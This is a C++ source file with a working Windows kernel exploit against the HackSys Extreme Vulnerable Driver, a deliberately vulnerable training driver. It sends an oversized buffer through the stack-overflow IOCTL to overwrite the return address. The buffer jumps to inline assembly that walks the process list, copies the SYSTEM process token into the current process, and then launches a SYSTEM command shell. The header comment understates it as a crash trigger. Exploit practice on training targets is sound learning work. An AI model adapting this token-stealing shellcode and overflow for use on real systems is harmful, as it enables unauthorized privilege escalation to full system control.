
// HackSysDriverCrashPoC.cpp : triggers a crash in the HackSys driver via the STACK_OVERFLOW IOCTL
#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>
#include <winioctl.h>
#include <TlHelp32.h>
#include <conio.h>

//Definition taken from HackSysExtremeVulnerableDriver.h
#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"

#define RET_OVERWRITE 2092

/* We Define the offsets we need for our shellcode here */
#define KTHREAD_OFFSET 0x124   //kpcr.prcbdata.currentThread
#define EPROCESS_OFFSET 0x050  //kthread.apcstate.kprocess
#define PROC_LINK_OFFSET 0x0b8 //eprocess.activeProcessLinks
#define TOKEN_OFFSET 0x0f8	   //eprocess.token
#define PID_OFFSET 0x0b4	   //eprocess.pid
#define SYSTEM_PID 0x004	   //pid associated with SYSTEM

void stealToken()
{
	/* Create the assembly inline of the process */
	__asm
	{
		; initialize - step 1
		pushad; save registers state

		; steps 2 - 4
		mov eax, fs:[KTHREAD_OFFSET]; get the current thread pointer
		mov eax, [eax + EPROCESS_OFFSET]; get a pointer to the current process struct

		mov ecx, eax; copy the current eprocess struct we will need this later

		mov ebx, [eax + TOKEN_OFFSET]; put the current token in ebx
		mov edx, SYSTEM_PID

		;loop over the active processes looking for a system process
		SystemProcLoop:
		mov eax, [eax + PROC_LINK_OFFSET]
		sub eax, PROC_LINK_OFFSET; go to next process
		cmp edx, [eax + PID_OFFSET]; compare the pid with 0x004
		jne SystemProcLoop
			
		
		; at this point we should have a process with pid 4
		; so we can steal its token
		mov ebx, [eax + TOKEN_OFFSET]
		mov[ecx + TOKEN_OFFSET], ebx; copy the system token

	

		;recover gracefully
		popad
		xor eax, eax 
		add esp, 0xe4
		pop ebp
		//int 3
		ret 8
		
	}
}

int main(int argc, CHAR* argv[])
{
	DWORD buff_size = 2096;
	PUCHAR in_buffer = NULL;
	LPVOID out_buffer = NULL;
	DWORD out_size = 0;
	DWORD bytes_returned;
	HANDLE handle = CreateFile(DEVICE_NAME,				//filename
		GENERIC_READ | GENERIC_WRITE,					//desired access
		FILE_SHARE_READ | FILE_SHARE_WRITE,				//shared mode allows other processes to read and write device
		NULL,											//security attributes
		OPEN_EXISTING,									//create disposition
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,	//attributes, overlapped means we are opening for asynchronous IO
		NULL);											//optional template file

	if (handle == INVALID_HANDLE_VALUE)
	{
		printf("[-] Could not get handle to device [-]\n");
		exit(-1);
	}
	else
	{
		printf("[+] Got handle to device 0x%x [+]\n", handle);
	}

	/* allocate memory on the heap in userspace for our buffer */
	in_buffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buff_size);

	if (!in_buffer)
		printf("[-] Heap alloc failed 0x%x [-]\n", GetLastError());

	/* Fill our buffer with A's */
	RtlFillMemory(in_buffer, buff_size, 0x41);

	/* Overwrite EIP to our shellcode */
	in_buffer[RET_OVERWRITE] = (DWORD)&stealToken & 0x000000FF;
	in_buffer[RET_OVERWRITE + 1] = ((DWORD)&stealToken & 0x0000FF00) >> 8;
	in_buffer[RET_OVERWRITE + 2] = ((DWORD)&stealToken & 0x00FF0000) >> 16;
	in_buffer[RET_OVERWRITE + 3] = ((DWORD)&stealToken & 0xFF000000) >> 24;
	
	printf("[+] Buffer allocated at 0x%p [+]\n", in_buffer);
	printf("[+] Sending IOCTL [+]\n");

	DeviceIoControl(handle,				  //the handle to the device
		HACKSYS_EVD_IOCTL_STACK_OVERFLOW, //the function to call
		(LPVOID)in_buffer,				  //pointer to input buffer
		buff_size,						  //size of input
		out_buffer,						  //pointer to ouput buffer
		out_size,						  //size of output buffer
		&bytes_returned,				  //stores how much data is written to output
		NULL);							  //no overlap
	
	//pop system shell and wait
	system("cmd.exe");
	_getch();

	HeapFree(GetProcessHeap(), 0, in_buffer);
	//CloseHandle(handle);
	return 0;
}
